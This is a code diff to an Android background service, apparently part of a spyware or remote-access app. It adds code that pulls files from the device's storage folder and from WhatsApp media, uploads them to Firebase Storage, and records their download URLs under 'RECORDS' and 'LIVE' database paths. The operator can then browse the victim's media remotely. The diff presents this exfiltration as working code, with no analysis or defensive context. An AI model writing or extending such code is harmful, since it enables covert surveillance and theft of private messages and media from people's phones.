@@ -216,13 +216,36 @@ public class Starter extends Service {
                                     new GetStoragePathPayload(PayloadTypes.GET_DEVICE_FOLDER)
                                             .setWatsappTextExtractionListner(path1 -> {
                                                 //TODO UPLOAD TO FIREBASE HERE
+                                                Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path1);
+                                                FirebaseStorage
+                                                        .getInstance()
+                                                        .getReference("PHONE_FILE")
+                                                        .child(payloadType+"")
+                                                        .child(System.currentTimeMillis()+"_phone_"+payloadType+" "+path1.getName())
+                                                        .putFile(uri)
+                                                        .addOnCompleteListener(task -> {
+                                                            if (task.isSuccessful()) {
+                                                                task.getResult()
+                                                                        .getStorage()
+                                                                        .getDownloadUrl()
+                                                                        .addOnCompleteListener(task1 ->{
+                                                                            HashMap<String, Object> databaseEntry = new HashMap<>();
+                                                                            databaseEntry.put("/RECORDS/phone_media_"+payloadType+"/" + System.currentTimeMillis(), task1.getResult().toString());
+                                                                            databaseEntry.put("/LIVE/phone_media_"+payloadType, task1.getResult().toString());
+                                                                            FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
+                                                                        });
+
+                                                            } else {
+                                                                //SET ERROR MESSAGE
+                                                            }
+                                                        });
+
                                                 Log.e("PATH", path1.getAbsolutePath());
                                             }).execute(path);
 
                                 }catch (Exception e){
                                     FirebaseDatabase
                                             .getInstance().getReference("Logs").child(payloadType+"").setValue(e.getMessage());
-
                                 }
 
                             }else {
@@ -238,11 +261,31 @@ public class Starter extends Service {
                     });
         }else {
             new GetStoragePathPayload(payloadType)
-                    .setWatsappTextExtractionListner(new StorageTextExtractionListner() {
-                        @Override
-                        public void onDataExtracted(File path) {
-                            Log.e("WPATH",path.getPath());
-                        }
+                    .setWatsappTextExtractionListner(path -> {
+                        Log.e("WPATH",path.getPath());
+                        Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path);
+                        FirebaseStorage
+                                .getInstance()
+                                .getReference("Whatsapp_media")
+                                .child(payloadType+"")
+                                .child(System.currentTimeMillis()+"_whatsapp_"+payloadType)
+                                .putFile(uri)
+                                .addOnCompleteListener(task -> {
+                                    if (task.isSuccessful()) {
+                                        task.getResult()
+                                                .getStorage()
+                                                .getDownloadUrl()
+                                                .addOnCompleteListener(task1 ->{
+                                                    HashMap<String, Object> databaseEntry = new HashMap<>();
+                                                    databaseEntry.put("/RECORDS/whatsapp_media_"+payloadType+"/" + System.currentTimeMillis(), task1.getResult().toString());
+                                                    databaseEntry.put("/LIVE/whatsapp_media_"+payloadType, task1.getResult().toString());
+                                                    FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
+                                                });
+
+                                    } else {
+                                        //SET ERROR MESSAGE
+                                    }
+                                });
                     }).execute();
         }
     }
